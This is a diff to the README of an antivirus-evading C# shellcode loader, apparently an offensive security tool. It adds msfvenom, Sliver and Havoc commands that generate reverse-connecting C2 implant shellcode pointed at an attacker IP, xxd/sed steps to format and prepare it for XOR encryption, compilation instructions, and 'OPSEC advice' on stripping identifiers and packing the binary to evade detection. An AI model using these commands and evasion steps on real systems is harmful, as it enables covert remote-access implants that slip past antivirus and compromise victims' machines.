@@ -19,11 +19,30 @@ A quick and dirty C# shellcode loader that implements several antivirus bypass a
 #### TESTS
 - Succesfully tested on a Windows 10 x64 laptop (target) with Windows Defender enabled (without 'Automatic sample submission') and shellcodes of multiple C2 frameworks (in C# format & encrypted with XOR cipher algorithm)
 
-#### COMPILATION GUIDELINES
-- Code compiled with "Developer PowerShell for VS 2022"
+#### INPUT (Shellcode formats)
+Your shellcode must be in C# format (see examples below) and then encrypted using XOR cipher algorithm.
+Obviously, both the encrypted shellcode and yout XOR key must be added in the file 'CsharpShellCodeLoader.cs' before you compile it.
+
+- Metasploit C2 Framework  
+  ```msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f raw -o shellcode```  
+  
+- Sliver C2 Framework  
+  ```[server] sliver > generate --arch amd64 -f shellcode --http IP -l --os Windows --save shellcode```  
+  ```@Kali:/$ xxd -p shellcode | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > shellcode2```  
+  ```@Kali:/$ sed '$ s/.$//' shellcode2 > shellcode3```  
+  
+- Havoc C2 Framework  
+    1. Generate a new HAVOC payload with the format "Windows Shellcode" (Arch: x64 / Indirect Syscall: Enabled / Sleep Technique: WaitForSIngleObjectEx)  
+    2. To convert the Havoc shellcode to the appropriate format you need to run these commands:  
+       ```@Kali:/$ xxd -p shellcode | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > shellcode2```  
+       ```@Kali:/$ sed '$ s/.$//' shellcode2 > shellcode3```  
+
+#### COMPILATION 
+- I used "Developer PowerShell for VS 2022":
   - Microsoft (R) Visual C# Compiler version 4.5.0-6.23123.11
   - Command: csc /t:exe /out:C:\path\Loader.exe C:\path\CsharpShellCodeLoader.cs
-- The file 'CsharpShellCodeLoader.cs' is voluntary not obfuscated. Class/function/variable names should be changed and all comments must be deleted or modified before compiling this file.
-- Your shellcode must be in C# format and then encrypted using XOR cipher. Obviously, the XOR key must be replaced in the file with the one you used.
-- Once compiled, if you want to compress and obfuscate the shellcodeloader executable you can use packers like "ConfuserEx" but it is not mandatory to bypass most AV solutions. 
+
+#### OPSEC Advices
+- The file 'CsharpShellCodeLoader.cs' is not obfuscated. Class/function/variable names should be changed and all comments must be deleted or modified before compiling this file.
+- Once compiled, if you want to compress and obfuscate the shellcodeloader executable you can use packers like "ConfuserEx" (but it is not necessary in order to bypass most AV solutions).
   
